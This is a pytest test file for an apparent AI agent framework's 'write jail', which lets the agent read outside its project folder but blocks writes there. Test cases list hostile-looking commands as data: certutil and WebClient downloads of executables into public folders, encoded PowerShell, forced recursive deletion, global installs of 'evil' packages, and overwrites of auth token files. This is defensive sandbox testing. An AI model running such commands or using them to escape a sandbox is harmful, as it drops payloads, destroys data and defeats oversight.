"""Project write jail: reads may leave the folder; writes may not (project scope)."""

from __future__ import annotations

from pathlib import Path
from types import SimpleNamespace

import pytest

from remedy.core.errors import SecurityError
from remedy.core.shell_write_jail import (
    check_shell_write_jail,
    extract_path_candidates,
    looks_like_mutation,
)
from remedy.core.workspace import (
    allowed_roots_for_scope,
    workspace_context_block,
    write_roots_for_scope,
)


def _make_runtime(proj: Path, *, scope: str = "project", home: Path | None = None):
    """Minimal runtime-shaped object with real resolve/write roots."""
    from remedy.core.workspace import (
        allowed_roots_for_scope as _ar,
    )
    from remedy.core.workspace import (
        effective_access_scope,
    )
    from remedy.core.workspace import (
        resolve_under_roots as _ru,
    )
    from remedy.core.workspace import (
        write_roots_for_scope as _wr,
    )

    home = home or (proj.parent / "homeuser")
    if not home.exists():
        home.mkdir(parents=True, exist_ok=True)

    class RT:
        def access_scope(self) -> str:
            return effective_access_scope(scope, str(proj))

        def effective_project_path(self) -> Path:
            return proj.resolve()

        def allowed_roots(self):
            return _ar(self.access_scope(), proj, home=home)

        def write_roots(self):
            return _wr(self.access_scope(), proj, home=home)

        def project_path_is_unset(self) -> bool:
            return False

        def resolve_tool_path(self, path: str, *, for_write: bool = False) -> Path:
            # Mirror BasicRuntime: project-bound writes never use full bypass.
            if for_write:
                roots = self.write_roots()
                scope = self.access_scope()
                enforce = "home" if scope == "home" else "project"
                return _ru(path or ".", roots, access_scope=enforce)
            return _ru(
                path or ".", self.allowed_roots(), access_scope=self.access_scope()
            )

        def _track_artifact(self, _p: str) -> None:
            pass

        def _register_comfyui_tools(self) -> None:
            pass

        def _register_vision_tools(self) -> None:
            pass

        def _register_local_discover_tools(self) -> None:
            pass

        def _register_skill_tools(self) -> None:
            pass

    return RT()


def test_write_roots_exclude_profile_folders(tmp_path: Path):
    home = tmp_path / "home"
    home.mkdir()
    for name in ("Desktop", "Documents", "Downloads"):
        (home / name).mkdir()
    proj = tmp_path / "MyProject"
    proj.mkdir()

    reads = [r.resolve() for r in allowed_roots_for_scope("project", proj, home=home)]
    writes = [r.resolve() for r in write_roots_for_scope("project", proj, home=home)]

    assert proj.resolve() in reads
    assert (home / "Desktop").resolve() in reads
    assert writes == [proj.resolve()]


def test_runtime_resolve_read_desktop_ok_write_denied(tmp_path: Path):
    home = tmp_path / "home"
    desk = home / "Desktop"
    desk.mkdir(parents=True)
    note = desk / "notes.txt"
    note.write_text("research", encoding="utf-8")
    proj = tmp_path / "proj"
    proj.mkdir()

    rt = _make_runtime(proj, scope="project", home=home)
    # Read path OK
    assert rt.resolve_tool_path(str(note), for_write=False) == note.resolve()
    # Write path denied
    with pytest.raises(SecurityError):
        rt.resolve_tool_path(str(desk / "escape.txt"), for_write=True)
    with pytest.raises(SecurityError):
        rt.resolve_tool_path(str(note), for_write=True)


def test_runtime_write_inside_project_ok(tmp_path: Path):
    home = tmp_path / "home"
    home.mkdir()
    proj = tmp_path / "proj"
    proj.mkdir()
    target = proj / "ok.txt"
    rt = _make_runtime(proj, scope="project", home=home)
    resolved = rt.resolve_tool_path("ok.txt", for_write=True)
    assert resolved == target.resolve()
    resolved = rt.resolve_tool_path(str(target), for_write=True)
    assert resolved == target.resolve()


def test_home_scope_allows_write_under_home(tmp_path: Path):
    home = tmp_path / "home"
    desk = home / "Desktop"
    desk.mkdir(parents=True)
    proj = tmp_path / "proj"
    proj.mkdir()
    rt = _make_runtime(proj, scope="home", home=home)
    p = rt.resolve_tool_path(str(desk / "x.txt"), for_write=True)
    assert p == (desk / "x.txt").resolve()


def test_full_scope_with_project_still_blocks_write_outside(tmp_path: Path):
    """full access expands reads, not project write jail."""
    home = tmp_path / "home"
    home.mkdir()
    desk = home / "Desktop"
    desk.mkdir()
    proj = tmp_path / "proj"
    proj.mkdir()
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    target = outside / "y.txt"
    rt = _make_runtime(proj, scope="full", home=home)
    # Reads may still be broad under full; writes stay in project.
    with pytest.raises(SecurityError):
        rt.resolve_tool_path(str(target), for_write=True)
    with pytest.raises(SecurityError):
        rt.resolve_tool_path(str(desk / "nope.txt"), for_write=True)
    ok = rt.resolve_tool_path("in_proj.txt", for_write=True)
    assert ok == (proj / "in_proj.txt").resolve()


@pytest.mark.asyncio
async def test_file_write_tool_blocks_desktop(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    # Isolate from host ~/.remedy approval_mode (CI is ask; local may be auto).
    monkeypatch.setattr(
        "remedy.interfaces.api_support.load_config",
        lambda: {"approval_mode": "auto", "access_scope": "project"},
    )
    prev = APPROVALS._mode  # noqa: SLF001
    APPROVALS.set_mode("auto")
    try:
        home = tmp_path / "home"
        desk = home / "Desktop"
        desk.mkdir(parents=True)
        proj = tmp_path / "proj"
        proj.mkdir()

        rt = _make_runtime(proj, scope="project", home=home)
        reg = ToolRegistry()
        # Attach registry + config-like attrs expected by tools
        rt.tool_registry = reg  # type: ignore[attr-defined]
        rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
        rt._session_id = "test-session"  # type: ignore[attr-defined]
        register_workspace_tools(rt)

        result = await reg.execute(
            "file_write", path=str(desk / "escape_jail.txt"), content="nope"
        )
        assert "PATH_DENIED" in result or "path not allowed" in result.lower()
        assert not (desk / "escape_jail.txt").exists()

        # Inside project still works
        ok = await reg.execute("file_write", path="inside.txt", content="yes")
        assert "PATH_DENIED" not in ok
        assert "APPROVAL_REQUIRED" not in ok
        assert (proj / "inside.txt").read_text(encoding="utf-8") == "yes"
    finally:
        APPROVALS.set_mode(prev)


@pytest.mark.asyncio
async def test_file_read_tool_allows_desktop(tmp_path: Path):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.skills.tool_registry import ToolRegistry

    home = tmp_path / "home"
    desk = home / "Desktop"
    desk.mkdir(parents=True)
    note = desk / "research.txt"
    note.write_text("outside knowledge", encoding="utf-8")
    proj = tmp_path / "proj"
    proj.mkdir()

    rt = _make_runtime(proj, scope="project", home=home)
    reg = ToolRegistry()
    rt.tool_registry = reg  # type: ignore[attr-defined]
    rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
    rt._session_id = "test-session"  # type: ignore[attr-defined]
    register_workspace_tools(rt)

    result = await reg.execute("file_read", path=str(note))
    assert "outside knowledge" in result
    assert "PATH_DENIED" not in result


@pytest.mark.asyncio
async def test_file_edit_tool_blocks_desktop(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    monkeypatch.setattr(
        "remedy.interfaces.api_support.load_config",
        lambda: {"approval_mode": "auto", "access_scope": "project"},
    )
    prev = APPROVALS._mode  # noqa: SLF001
    APPROVALS.set_mode("auto")
    try:
        home = tmp_path / "home"
        desk = home / "Desktop"
        desk.mkdir(parents=True)
        note = desk / "research.txt"
        note.write_text("alpha", encoding="utf-8")
        proj = tmp_path / "proj"
        proj.mkdir()
        (proj / "local.txt").write_text("alpha", encoding="utf-8")

        rt = _make_runtime(proj, scope="project", home=home)
        reg = ToolRegistry()
        rt.tool_registry = reg  # type: ignore[attr-defined]
        rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
        rt._session_id = "test-session"  # type: ignore[attr-defined]
        register_workspace_tools(rt)

        denied = await reg.execute(
            "file_edit", path=str(note), old_string="alpha", new_string="beta"
        )
        assert "PATH_DENIED" in denied or "path not allowed" in denied.lower()
        assert note.read_text(encoding="utf-8") == "alpha"

        ok = await reg.execute(
            "file_edit", path="local.txt", old_string="alpha", new_string="beta"
        )
        assert "PATH_DENIED" not in ok
        assert "APPROVAL_REQUIRED" not in ok
        assert (proj / "local.txt").read_text(encoding="utf-8") == "beta"
    finally:
        APPROVALS.set_mode(prev)


def test_workspace_context_mentions_write_jail(tmp_path: Path):
    block = workspace_context_block(tmp_path, access_scope="project")
    assert "focus folder" in block.lower() or "project" in block.lower()
    assert "file_write" in block or "edit" in block.lower()


def test_shell_write_jail_blocks_sibling_set_content(tmp_path: Path):
    """SecretSticky must not Set-Content into SecretFolder (sibling trees)."""
    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    roots = [sticky.resolve()]

    cmd = (
        f'Set-Content -Path "{folder / "vault.rs"}" -Value "pwned" -Encoding utf8'
    )
    assert looks_like_mutation(cmd)
    hit = check_shell_write_jail(
        cmd,
        write_roots=roots,
        cwd=sticky,
        project_bound=True,
        access_scope="project",
    )
    assert hit is not None
    assert "WRITE" in hit.upper() or "outside" in hit.lower() or "jail" in hit.lower()

    # Inside focus is fine
    ok_cmd = f'Set-Content -Path "{sticky / "ok.txt"}" -Value "yes"'
    assert (
        check_shell_write_jail(
            ok_cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is None
    )

    # Read-only with absolute sibling path is allowed (research)
    read_cmd = f'Get-Content "{folder / "README.md"}"'
    assert (
        check_shell_write_jail(
            read_cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is None
    )


def test_shell_write_jail_blocks_sc_copy_python_and_opaque(tmp_path: Path):
    """Review P0: sc/copy/python -c/env path mutation must not slip past jail."""
    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    roots = [sticky.resolve()]
    target = folder / "pwn.txt"

    cases = [
        f'sc "{target}" "hi"',
        f'copy a.txt "{target}"',
        f'xcopy a.txt "{target}"',
        f'python -c "open(r\'{target}\', \'w\').write(\'x\')"',
        r'Set-Content -Path $env:USERPROFILE\Desktop\leak.txt -Value z',
        r'Set-Content -Path (Join-Path $env:USERPROFILE "SecretFolder\x") -Value z',
    ]
    for cmd in cases:
        assert looks_like_mutation(cmd), cmd
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for: {cmd}"


def test_shell_write_jail_blocks_mixed_opaque_dest(tmp_path: Path):
    """Issue 9: in-root source + opaque dest must still fail closed."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    (sticky / "a.txt").write_text("x", encoding="utf-8")
    roots = [sticky.resolve()]
    cases = [
        rf'copy "{sticky / "a.txt"}" $env:USERPROFILE\Desktop\b.txt',
        rf'Copy-Item "{sticky / "a.txt"}" (Join-Path $env:USERPROFILE Desktop\b.txt)',
        r'copy a.txt %USERPROFILE%\Desktop\b.txt',
        r'Set-Content -Path %TEMP%\leak.txt -Value z',
        r'iwr https://example.com -OutFile %TEMP%\x.html',
        r'curl -o %USERPROFILE%\Desktop\x.html https://example.com',
    ]
    for cmd in cases:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for mixed/opaque: {cmd}"


def test_shell_write_jail_blocks_encoded_and_archive(tmp_path: Path):
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    block = check_shell_write_jail(
        "powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
        write_roots=[proj],
        cwd=proj,
        project_bound=True,
    )
    assert block is not None
    assert "encoded" in block.lower() or "archive" in block.lower() or "cannot be proven" in block.lower()
    block2 = check_shell_write_jail(
        "Expand-Archive -Path a.zip -DestinationPath C:\\Users\\Public\\out",
        write_roots=[proj],
        cwd=proj,
        project_bound=True,
    )
    assert block2 is not None


def test_shell_write_jail_blocks_global_package_installs(tmp_path: Path):
    """Global package managers write outside project roots (red-team 2026-07-30)."""
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    for cmd in (
        "npm install -g evil-pkg",
        "npm i --global evil",
        "npm -g install evil",
        "yarn global add evil",
        "cargo install ripgrep",
        "gem install foo",
        "go install example.com/x@latest",
        "pip install --user evil",
        "python -m pip install --user evil",
    ):
        hit = check_shell_write_jail(
            cmd, write_roots=[proj], cwd=proj, project_bound=True
        )
        assert hit is not None, f"expected block for: {cmd}"
    # Local npm install under project cwd remains allowed (capability)
    assert (
        check_shell_write_jail(
            "npm install lodash",
            write_roots=[proj],
            cwd=proj,
            project_bound=True,
        )
        is None
    )


def test_shell_write_jail_blocks_powershell_short_e(tmp_path: Path):
    """powershell -e <base64> is EncodedCommand short form — fail closed."""
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    for cmd in (
        "powershell -e JABzAGU=",
        "powershell -E JABzAGU=",
        "pwsh -NoP -e SQBFAFgA",
        "powershell.exe -NonInteractive -e XX",
    ):
        hit = check_shell_write_jail(
            cmd, write_roots=[proj], cwd=proj, project_bound=True
        )
        assert hit is not None, f"expected block for: {cmd}"
        assert "encoded" in hit.lower() or "cannot be proven" in hit.lower()


def test_shell_write_jail_blocks_fsutil_createnew(tmp_path: Path):
    """fsutil file createnew outside roots must not slip past mutation hints."""
    from remedy.core.shell_write_jail import check_shell_write_jail, looks_like_mutation

    proj = tmp_path / "proj"
    proj.mkdir()
    cmd = r"fsutil file createnew C:\Users\Public\pwn.txt 1"
    assert looks_like_mutation(cmd)
    hit = check_shell_write_jail(
        cmd, write_roots=[proj], cwd=proj, project_bound=True
    )
    assert hit is not None
    assert "outside" in hit.lower() or "write root" in hit.lower()


def test_shell_write_jail_blocks_download_drop_vectors(tmp_path: Path):
    """WebClient / certutil urlcache / FromBase64 / IRM -OutFile hide destinations."""
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    for cmd in (
        r"(New-Object Net.WebClient).DownloadFile('http://x','C:\Users\Public\p.exe')",
        r"certutil -urlcache -split -f http://x/a.exe C:\Users\Public\a.exe",
        r"[Convert]::FromBase64String('YWJj') | Set-Content out.bin",
        r"Invoke-RestMethod http://x -OutFile C:\Users\Public\p.bin",
        r"$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://x')",
    ):
        hit = check_shell_write_jail(
            cmd, write_roots=[proj], cwd=proj, project_bound=True
        )
        assert hit is not None, f"expected block for: {cmd}"
        assert "encoded" in hit.lower() or "cannot be proven" in hit.lower()


def test_shell_write_jail_blocks_bare_ps_var_path(tmp_path: Path):
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    proj.mkdir()
    block = check_shell_write_jail(
        'Set-Content -Path $dest -Value "pwned"',
        write_roots=[proj],
        cwd=proj,
        project_bound=True,
    )
    assert block is not None
    assert "variable" in block.lower() or "cannot prove" in block.lower()


def test_shell_write_jail_blocks_mutation_without_paths(tmp_path: Path):
    from remedy.core.shell_write_jail import check_shell_write_jail

    proj = tmp_path / "proj"
    outside = tmp_path / "other"
    proj.mkdir()
    outside.mkdir()
    # cwd inside project → pathless mutation (e.g. npm install) allowed
    ok = check_shell_write_jail(
        "npm install left-pad",
        write_roots=[proj],
        cwd=proj,
        project_bound=True,
    )
    assert ok is None
    # cwd outside project → pathless mutation blocked
    block = check_shell_write_jail(
        "Remove-Item -Recurse -Force",
        write_roots=[proj],
        cwd=outside,
        project_bound=True,
    )
    assert block is not None
    assert "write root" in block.lower() or "proven path" in block.lower()


def test_shell_write_jail_blocks_interpreter_oneshot_without_paths(tmp_path: Path):
    """Issue 10: python -c / node -e without extractable paths fail closed."""
    sticky = tmp_path / "SecretSticky"
    sticky.mkdir()
    roots = [sticky.resolve()]
    cases = [
        r'''python -c "open(r'C:\\Users\\Public\\pwn.txt','w').write('x')"''',
        r'''python -c "from pathlib import Path; Path.home().joinpath('Desktop','x').write_text('z')"''',
        r'''node -e "require('fs').writeFileSync(process.env.USERPROFILE+'/Desktop/x','z')"''',
        r'''node -e "require('fs').writeFileSync('C:\\\\Users\\\\Public\\\\x','z')"''',
    ]
    for cmd in cases:
        hit = check_shell_write_jail(
            cmd,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        assert hit is not None, f"expected jail for interpreter: {cmd}"
    # Pure print under project cwd is allowed (partner one-shots / probes)
    pure = r'''py -c "print(1)"'''
    assert (
        check_shell_write_jail(
            pure,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is None
    ), "pure py -c print under project cwd should not jail"

    # Proven in-root path still allowed (no outside offenders, no opaque)
    ok = f'''python -c "open(r'{sticky / "ok.txt"}','w').write('y')"'''
    assert (
        check_shell_write_jail(
            ok,
            write_roots=roots,
            cwd=sticky,
            project_bound=True,
            access_scope="project",
        )
        is None
    )


def test_shell_write_jail_blocks_relative_escape(tmp_path: Path):
    proj = tmp_path / "SecretSticky"
    sibling = tmp_path / "SecretFolder"
    proj.mkdir()
    sibling.mkdir()
    cmd = r'Set-Content -Path "..\SecretFolder\leak.txt" -Value x'
    hit = check_shell_write_jail(
        cmd,
        write_roots=[proj.resolve()],
        cwd=proj,
        project_bound=True,
        access_scope="project",
    )
    assert hit is not None


def test_shell_write_jail_extracts_windows_paths():
    paths = extract_path_candidates(
        r'Set-Content C:\Users\Administrator\SecretFolder\x.rs -Value a'
    )
    assert any("SecretFolder" in p for p in paths)


def test_shell_write_jail_blocks_auth_under_home_write_roots(tmp_path: Path, monkeypatch):
    """Home-scope write roots include user home; auth/** must still be refused.

    Gap: shell jail only checked path-under-roots, so Set-Content into
    ``~/.remedy/auth`` under access_scope=home was allowed. File tools already
    refuse via ``resolve_under_roots``; shell must match.
    """
    from remedy.core.security import clear_protected_auth_roots_cache

    home = tmp_path / "home"
    proj = tmp_path / "proj"
    home.mkdir()
    proj.mkdir()
    auth = home / ".remedy" / "auth"
    auth.mkdir(parents=True)
    secret = auth / "local_api_token"
    secret.write_text("tokensecretvalue", encoding="utf-8")

    # Path-part (.remedy/auth) detection works without REMEDY_HOME; also pin env.
    monkeypatch.setenv("REMEDY_HOME", str(home / ".remedy"))
    clear_protected_auth_roots_cache()

    roots = write_roots_for_scope("home", proj, home=home)
    assert any(r.resolve() == home.resolve() for r in roots)

    # File-tool path: home scope still protected
    rt = _make_runtime(proj, scope="home", home=home)
    with pytest.raises(SecurityError) as ei:
        rt.resolve_tool_path(str(secret), for_write=True)
    assert ei.value.details.get("rule") == "protected_secret_path"

    cmd = f'Set-Content -Path "{secret}" -Value "pwned" -Encoding utf8'
    assert looks_like_mutation(cmd)
    hit = check_shell_write_jail(
        cmd,
        write_roots=roots,
        cwd=proj,
        project_bound=True,
        access_scope="home",
    )
    assert hit is not None, "shell must refuse auth write under home roots"
    assert "auth" in hit.lower() or "protected" in hit.lower() or "secret" in hit.lower()

    # Same for provider_keys (absolute) under home write roots
    keys = auth / "provider_keys.json"
    hit_keys = check_shell_write_jail(
        f'Set-Content -Path "{keys}" -Value "{{}}"',
        write_roots=roots,
        cwd=home,
        project_bound=True,
        access_scope="home",
    )
    assert hit_keys is not None

    # Non-auth sibling under home remains allowed by the jail (path under roots)
    ok = check_shell_write_jail(
        f'Set-Content -Path "{home / "notes.txt"}" -Value "ok"',
        write_roots=roots,
        cwd=proj,
        project_bound=True,
        access_scope="home",
    )
    assert ok is None
    clear_protected_auth_roots_cache()


@pytest.mark.asyncio
async def test_bash_exec_enforces_shell_write_jail(tmp_path: Path, monkeypatch):
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)

    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    home = tmp_path / "home"
    home.mkdir()

    rt = _make_runtime(sticky, scope="project", home=home)
    reg = ToolRegistry()
    rt.tool_registry = reg  # type: ignore[attr-defined]
    rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
    rt._session_id = "jail-session"  # type: ignore[attr-defined]
    register_workspace_tools(rt)

    bad = (
        f'Set-Content -Path "{folder / "pwn.txt"}" -Value "nope" -Encoding utf8'
    )
    result = await reg.execute("bash_exec", command=bad)
    assert "WRITE_JAIL" in result or "jail" in result.lower() or "outside" in result.lower()
    assert not (folder / "pwn.txt").exists()


@pytest.mark.asyncio
async def test_bash_exec_write_roots_fail_closed(tmp_path: Path, monkeypatch):
    """write_roots() failure must not fall back to Desktop/Docs read roots."""
    from remedy.core.agent_workspace_tools import register_workspace_tools
    from remedy.core.approvals import APPROVALS
    from remedy.skills.tool_registry import ToolRegistry

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)

    proj = tmp_path / "proj"
    proj.mkdir()
    home = tmp_path / "home"
    home.mkdir()
    rt = _make_runtime(proj, scope="project", home=home)
    reg = ToolRegistry()
    rt.tool_registry = reg  # type: ignore[attr-defined]
    rt.config = SimpleNamespace(home_dir=str(tmp_path / "remedy_home"))  # type: ignore[attr-defined]
    rt._session_id = "jail-session"  # type: ignore[attr-defined]

    def _boom():
        raise RuntimeError("roots unavailable")

    rt.write_roots = _boom  # type: ignore[method-assign]
    register_workspace_tools(rt)
    out = await reg.execute("bash_exec", command="echo hi")
    assert "WRITE_JAIL" in out
    assert "roots" in out.lower()


@pytest.mark.asyncio
async def test_job_run_verify_write_jail_parity(tmp_path: Path, monkeypatch):
    """job_run/mission_verify must share bash_exec shell write jail (no silent bypass)."""
    from remedy.core.approvals import APPROVALS
    from remedy.core.jobs import run_verify_job

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)

    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()
    rt = _make_runtime(sticky, scope="project", home=tmp_path / "home")

    bad = f'Set-Content -Path "{folder / "pwn.txt"}" -Value "nope" -Encoding utf8'
    result = await run_verify_job(rt, command=bad, path=str(sticky))
    assert result.ok is False
    assert "WRITE_JAIL" in result.summary or "jail" in result.summary.lower()
    assert not (folder / "pwn.txt").exists()
    assert (result.details or {}).get("write_jail") or "WRITE_JAIL" in result.summary


@pytest.mark.asyncio
async def test_job_run_verify_write_roots_fail_closed(tmp_path: Path, monkeypatch):
    """write_roots() failure on verify job must fail closed (no shell run)."""
    from remedy.core.approvals import APPROVALS
    from remedy.core.jobs import run_verify_job

    monkeypatch.setattr(APPROVALS, "needs_ask", lambda *a, **k: None)

    proj = tmp_path / "proj"
    proj.mkdir()
    rt = _make_runtime(proj, scope="project", home=tmp_path / "home")

    def _boom():
        raise RuntimeError("roots unavailable")

    rt.write_roots = _boom  # type: ignore[method-assign]
    result = await run_verify_job(rt, command="echo hi")
    assert result.ok is False
    assert "WRITE_JAIL" in result.summary
    assert "roots" in result.summary.lower()


@pytest.mark.asyncio
async def test_update_settings_refuses_project_switch_without_force(tmp_path: Path):
    """Regression: agent must not silently retarget SecretSticky → SecretFolder."""
    from remedy.core.agent_settings_tools import register_settings_tools
    from remedy.skills.tool_registry import ToolRegistry

    sticky = tmp_path / "SecretSticky"
    folder = tmp_path / "SecretFolder"
    sticky.mkdir()
    folder.mkdir()

    class RT:
        def __init__(self) -> None:
            self.tool_registry = ToolRegistry()
            self._proj = sticky.resolve()

        def project_path_is_unset(self) -> bool:
            return False

        def effective_project_path(self) -> Path:
            return self._proj

    rt = RT()
    register_settings_tools(rt)
    out = await rt.tool_registry.execute(
        "update_settings",
        project_path=str(folder),
    )
    assert "PROJECT_JAIL" in out or "refusing to switch" in out.lower()

